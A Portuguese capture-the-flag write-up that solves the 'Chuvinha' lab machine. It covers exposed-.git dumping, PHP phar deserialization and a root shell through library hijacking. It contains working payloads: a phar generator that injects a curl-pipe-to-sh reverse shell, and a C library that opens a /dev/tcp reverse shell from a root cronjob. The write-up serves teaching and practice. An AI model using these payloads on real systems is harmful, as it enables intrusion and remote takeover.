---
layout: article
title:  "UHCCTF (Classificatória) - Chuvinha"
tags: pt-br ctf write-up
---
 

# Recon

(Não usei o nmap pois abri a máquina no meu computador, o nmap não apontaria nada demais se eu rodasse ele no UHCLabs ou no próprio dia do UHC)

![/assets/chuvinha/Untitled.png](/assets/chuvinha/Untitled.png)

De início o site é um blog sobre hacking e possui alguns lugares para compra de cursos, incluindo ZAP LOCKING (trava zap)...

Dando uma olhada no site em busca de falhas e também no código fonte, a primeira coisa que eu tentei "explorar" foi um formulário de e-mail no final da página, em busca de alguns Comand Injections, Server-side Request Forgery e etc.

![/assets/chuvinha/Untitled%201.png](/assets/chuvinha/Untitled%201.png)

Porém não encontrei nada. 

Então segui e rodei um Fuzzing em busca de arquivos e diretórios no site, utilizei uma ferramenta chamada "ffuf":

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://127.0.0.1/FUZZ' -c
```

![/assets/chuvinha/Untitled%202.png](/assets/chuvinha/Untitled%202.png)

Como está no comando acima eu utilizei a wordlist "common.txt" do repositório seclists no github. De início houve alguns retornos interessantes, eu poderia rodar outras wordlists, normalmente eu uso a "common.txt, quickhits.txt e big.txt".

```
LICENSE                - Apenas uma licensa de código, muito comum em ctfs;
admin.php              - Painel de administração, vamos voltar nele mais tarde;
.hta                   - Arquivos do apache, status code 403 acesso negado!
css                    - Pasta de arquivos do CSS, acesso negado!
.git/HEAD              - ".git" exposed uma vulnerabilidade crítica;
font                   - Arquivo de fontes, acesso negado!
fonts                  - Arquivo de fontes, acesso negado!
img                    - Uma pasta com as imagens do site, acesso negado!
index.html             - Página incial do site;
.htaccess              - Arquivos do apache, status code 403 acesso negado!
js                     - Arquivos de javascript, acesso negado!
.htpasswd              - Arquivos do apache, status code 403 acesso negado!
server-status          - Script que verifica se o servidor está online, porém, status code 403 acesso negado!
uploads                - Pasta de uploads, interessante... mas acesso negado.
```

Na página /admin.php temos um redirect para /login.php onde existe formulário de login, podemos verificar se existe alguma forma de achar credenciais e fazer o login ou fazer algum tipo de bypass.

![/assets/chuvinha/Untitled%203.png](/assets/chuvinha/Untitled%203.png)

Na página /.git parece que temos uma possível falha de "git exposed", vamos verificar se é válida e se sim vamos explora-la.

(Ao invés de entrar no "/.git/HEAD"  verifiquei o ".git":

![/assets/chuvinha/Untitled%204.png](/assets/chuvinha/Untitled%204.png)

Temos uma página dizendo que não podemos acessar o .git, esse template é incomum de ver em páginas com .git exposto, ai deve ter algo, dando um Ctrl+U para verificar o código fonte da página acabei encontrando a primeira flag! (sempre é bom ler o código fonte das aplicações).

![/assets/chuvinha/Untitled%205.png](/assets/chuvinha/Untitled%205.png)

Agora as chances da exploração serem pela falha de git exposed aumentaram pelo fato da primeira flag estar lá.

Se o desenvolvedor utiliza o Git para controle de versões do site, lá ficariam localizados todos os arquivos do site, commits (pequenas notas sobre o que mudou de versão para versão) e etc, o /.git não deveria ser acessível pelo público. 

# Exploitation 
## Parte 1

Para explorar o Git Exposed existem duas formas, de forma manual, e usando algumas tools. Eu recomendo tentar fazer de forma manual, e depois rodar a Tool, para aprender o que realmente a Tool faz. Vou deixar um link onde existe um artigo sobre falha de Git Exposed e sobre como explorar de forma manual ([https://medium.com/swlh/hacking-git-directories-e0e60fa79a36](https://medium.com/swlh/hacking-git-directories-e0e60fa79a36)).

Como disse acima vamos usar algumas ferramentas para essa exploração, no caso elas estão em um repositório do GitHub que tem o nome de GitTools ([https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools))

Na verdade é um pacote com 3 scripts, vamos usar dois deles, o Dumper e o Extractor.

Primeiro o Dumper para dumpar as coisas que estão no Git da máquina. (o segundo argumento é a pasta para onde os arquivos vão, botei na pasta onde está o script de extrair os arquivos para facilitar).

```bash
./gitdumper.sh 'http://127.0.0.1/.git/' ~/Tools/GitTools/Extractor/dumpchuvinha
```

![/assets/chuvinha/Untitled%206.png](/assets/chuvinha/Untitled%206.png)

Agora vamos para o diretório do Extractor e vamos extrair esse dump de arquivos para podermos ler:

```bash
./extractor.sh dumpchuvinha extractchuvinha
```

![/assets/chuvinha/Untitled%207.png](/assets/chuvinha/Untitled%207.png)

Agora temos todos os arquivos do site na nossa maquina! 

E parece que tem uma flag aqui hehe:

![/assets/chuvinha/Untitled%208.png](/assets/chuvinha/Untitled%208.png)

Parece que teremos que fazer um code review...

Vou abrir tudo no VisualStudioCode para facilitar.

Na primeira versão do site (/0-be7dbd2b1e15ffec896cf61484c5a89d18b77335) temos um arquivo de log do apache para ler.

![/assets/chuvinha/Untitled%209.png](/assets/chuvinha/Untitled%209.png)

São várias solicitações GET para o site que não aparentam ter nada de interessante, são tantas iguais o que me da a ideia de procurar por algo diferente em meio a todas essas iguais, dando um Ctrl+F para pesquisar dentro do arquivo, eu procuro por "POST" um outro método http, e incrivelmente eu encontro um request POST de uma autenticação, com credenciais para a página login.php, na fase de reconhecimento identificamos a página admin.php, muito provavelmente essas credenciais são do administrador do site.

![/assets/chuvinha/Untitled%2010.png](/assets/chuvinha/Untitled%2010.png)

Como é um request php parece que a senha está encodada em string de URL, vou utilizar um decoder de URL para arrumar isso.

![/assets/chuvinha/Untitled%2011.png](/assets/chuvinha/Untitled%2011.png)

Ok, vamos testar essas credenciais!

![/assets/chuvinha/Untitled%2012.png](/assets/chuvinha/Untitled%2012.png)

Logamos! 

(Um aviso: Agora a exploração será um pouco complicada, não prometo que vai ser o melhor jeito de explicar porém darei o meu melhor)

Nessa página temos um lugar para colocar uma URL de imagem e um campo que checa o tamanho da imagem (Arquivo).

Tentei colocar alguns arquivos para tentar upar alguma shell, mas não tive resultados.

Vamos retornar para o código que dumpamos para entender melhor como que isso funciona:

![/assets/chuvinha/Untitled%2013.png](/assets/chuvinha/Untitled%2013.png)

Nós passamos um link e o php executa um wget para esse link pegando o arquivo e salvando (por conta da função escapeshellarg() nós não conseguiremos manipular o input para trigar um RCE), mas existem outras formas...

Depois ele roda um filesize() no arquivo e retorna o outupt na página.

Um adendo a uma parte do código curiosa no começo dele:

![/assets/chuvinha/Untitled%2014.png](/assets/chuvinha/Untitled%2014.png)

Parece que temos uma função que remove algo do servidor com o comando "rm", no caso o $package_name, será que tem alguma forma de modificar esse objeto $package_name para algo que escapasse do comando "rm" e nós conseguíssemos rodar comandos no servidor?

Dando uma pesquisada pelas funções que tem no código ( filesize() e __destruct() ) acabei descobrindo uma forma de desserealização insegura com arquivos phar.

# Exploitation
## Parte 2

O objetivo de um ataque de desserealização insegura em uma aplicação web é poder manipular/injetar objetos, e é o que temos que fazer com o objeto $packagename para conseguir um RCE.

Vamos utilizar arquivos phar que são gerados com a classe Phar que é utilizada para empacotar aplicações PHP em um único arquivo que pode ser facilmente distribuído e executado. Se ficou complicado explicarei melhor, pense em um arquivo zip com varias coisas dentro, esse é o arquivo phar no php porém com vários objetos e classes dentro.

A sacada é que existem algumas funções no php que quando executadas em arquivos phar desserealizam os objetos dele, uma dessas funções é a filesize(), então o que temos que fazer é instanciar a classe Package onde está a parte vulnerável da aplicação e declarar o nosso $package_name com o nosso payload.

Como na outra parte da exploração vou deixar alguns links de artigos e em especial um vídeo do ippsec (que inclusive narra o UHC em algumas edições).

Artigos: 
- [https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
- [https://blog.ripstech.com/2018/new-php-exploitation-technique/](https://www.youtube.com/watch?v=fHZKSCMWqF4)

Vídeos:

- [https://www.youtube.com/watch?v=fHZKSCMWqF4](https://www.youtube.com/watch?v=fHZKSCMWqF4)

Ok, vamos começar a brincadeira!

Para gerar o arquivo phar vou utilizar um script pronto do PayloadAllTheThings: 

([https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure Deserialization/PHP.md#php-phar-deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md#php-phar-deserialization))

```php
<?php
class PDFGenerator { }

//Create a new instance of the Dummy class and modify its property
$dummy = new PDFGenerator();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //our payload

// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

/* Add a new file in the archive with "text" as its content*/
$poc["file"] = "text";
// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);
// Stop buffering and write changes to disk
$poc->stopBuffering();
?>
```

Agora vamos começar alterando o nome da classe "PDFGenerator" para o nome da nossa classe vulnerável.

```
PDFGenerator —> Package
```

Depois o objeto "filename" para o nome do nosso objeto onde temos que escrever o payload 

```
filename —> package_name
```

E então temos que escrever a nossa payload, como o comando que vai rodar é um "rm" teremos que escapar dele:

```
rm payload
```

Existem várias formas de se fazer isso( | , ; ) irei fazer com $(), o comando rodaria mais ou menos assim no servidor:

```
rm $(payload)
```

Assim estaríamos escapando do "rm" e podendo escrever o que quiséssemos de comando no lugar de payload.

O script terá que ficar mais ou menos assim:

```php
<?php
class Package { }

//Create a new instance of the Dummy class and modify its property
$dummy = new Package();
//$dummy->callback = "passthru";
$dummy->package_name = "$(curl http://reverse-shell.sh/172.31.228.136:1234 | sh ) "; //our payload

// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

/* Add a new file in the archive with "text" as its content*/
$poc["file"] = "text";
// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);
// Stop buffering and write changes to disk
$poc->stopBuffering();
?>
```

Minha payload foi uma forma bem legal de pegar reverse shell, usando um site, logo depois passei meu ip e a porta onde ele deve se conectar.

Agora vamos gerar o arquivo phar!

![/assets/chuvinha/Untitled%2015.png](/assets/chuvinha/Untitled%2015.png)

Parece que nossa configuração do php não nos deixa gerar um arquivo phar, vamos arrumar isso.

```php
php --ini
```

Isso vai retornar onde está seu arquivo de configuração do php, vamos editar ele, procurando por "phar" vamos modificar uma linha: (removendo o ; do começo dela e escrevendo "Off" no lugar de  "On")

![/assets/chuvinha/Untitled%2016.png](/assets/chuvinha/Untitled%2016.png)

E então:

![/assets/chuvinha/Untitled%2017.png](/assets/chuvinha/Untitled%2017.png)

Agora deve funcionar:

![/assets/chuvinha/Untitled%2018.png](/assets/chuvinha/Untitled%2018.png)

Temos nosso payload. Para fazer o donwload dele na máquina vou criar um servidor python na minha maquina:

([https://github.com/viniciuspereiras/bingo](https://github.com/viniciuspereiras/bingo))

```bash
bingo 
```

ou

```bash
python3 -m http.server 
```

E o download:

![/assets/chuvinha/Untitled%2019.png](/assets/chuvinha/Untitled%2019.png)

Ok retornou com um "File downloaded! You can access it Here" vou clicar no Here para ver o caminho onde o arquivo foi salvo.

![/assets/chuvinha/Untitled%2020.png](/assets/chuvinha/Untitled%2020.png)

Agora vamos rodar a função do filesize() nele mas usando um "phar://./" antes para funcionar, e também abriremos um netcat para ouvir na porta onde colocamos (no caso na porta 1234)

![/assets/chuvinha/Untitled%2021.png](/assets/chuvinha/Untitled%2021.png)

Aqui está nossa shell, para ela ficar mais interativa usei o "rlwrap" antes do netcat.

# Pós-Exploitation

Agora que estamos com shell precisamos escalar nossos privilégios na máquina, estamos como o usuário do apache "www-data".

Verifiquei os diretórios atrás de coisas, verifiquei as permissões de sudo (aparentemente não podemos rodar sudo na máquina), e verifiquei as permissões de binários também, e no fim rodei um linpeas para garantir. 

Achei uma pasta de um script na pasta /opt do linux, o script é um monitorador de diretórios git expostos (cômico pois ele falhou lá atrás). E tem cara de que vai falhar agora nos dando uma shell de root.

![/assets/chuvinha/Untitled%2022.png](/assets/chuvinha/Untitled%2022.png)

Lendo o script em c, percebemos que ele é bem simples, e opa achamos mais uma flag!

```cpp
#include <stdio.h>
#include <stdlib.h>
#include "gitlib/libgitutils.h"

// UHC{s1mpl3%%%%%%%%%%%%%%t0_RCE}

int main(){
    check_git_safety();
}$
```

Lendo o [README.md](http://readme.md) podemos ver como que o script foi instalado e um pouco de como ele funciona.

![/assets/chuvinha/Untitled%2023.png](/assets/chuvinha/Untitled%2023.png)

Podemos perceber que o script utliza uma biblioteca compartilhada, poderiamos trocar a biblioteca que ele está usando para uma biblioteca nossa e subscrever  a função que o script usa, no caso "check_git_safety()".

Isto se chama Library Hijacking nesse caso em libs de C.

Pesquisando sobre como criar libs em C cheguei a simples conclusão que só precisamos escrever uma nova função num script ".c" normal e compilar como uma biblioteca.

Então vamos escrever nossa biblioteca falsificada e declarar nossa função:

```cpp
#include <stdlib.h>
void check_git_safety() {
        system("bash -c 'bash -i >& /dev/tcp/172.20.17.36/8989 0>&1'");
}
```

Como pode ver subscrevi a função check_git_safety() para rodar a função system com o comando para nos mandar uma reverse shell.

Ela iria mandar a shell como root já que no [README.md](http://readme.md) percebemos que o script roda como um cronjob de root.

Então na minha máquina vou compilar o script para transformar numa biblioteca compartilhada.

(O nome do script é libgitutils.c)

Vamos compilar:

```bash
gcc libgitutils.c -fpic -c
```

Isso vai gerar um arquivo libgitutils.o 

```bash
gcc -shared -o libgitutils.so libgitutils.o
```

Agora temos nossa biblioteca compartilhada [libgitutils.so](http://libgitutils.so) .

Vamos novamente abrir um servidor python na nossa máquina para passar a biblioteca compartilhada para dentro na máquina que temos shell.

![/assets/chuvinha/Untitled%2024.png](/assets/chuvinha/Untitled%2024.png)

Agora com a nossa biblioteca falsificada dentro da máquina vamos seguir as instruções do [README.md](http://readme.md) e copiar nossa lib falsificada para o diretório das instruções.

Primeira instrução:

```
1. Copy our libgitutils.so library to /lib/x86_64-linux-gnu/libgitutils.so
```

Vamos copiar:

```bash
cp libgitutils.so /lib/x86_64-linux-gnu/libgitutils.so
```

Segunda instrução:

```
2. Install a cronjob that runs /opt/git-monitorer/gitmon every minute
```

Como já alteramos a biblioteca, a cada um minuto o script deve ser rodado, então vamos apenas abrir a porta 8989 da nossa máquina para receber a reverse shell e esperar um minuto.

![/assets/chuvinha/Untitled%2025.png](/assets/chuvinha/Untitled%2025.png)

Ownamos!

Agora vamos ver se achamos a flag, dando uma olhada rápida pelo diretório /root, ela já estava lá.

![/assets/chuvinha/Untitled%2026.png](/assets/chuvinha/Untitled%2026.png)

É isso XD .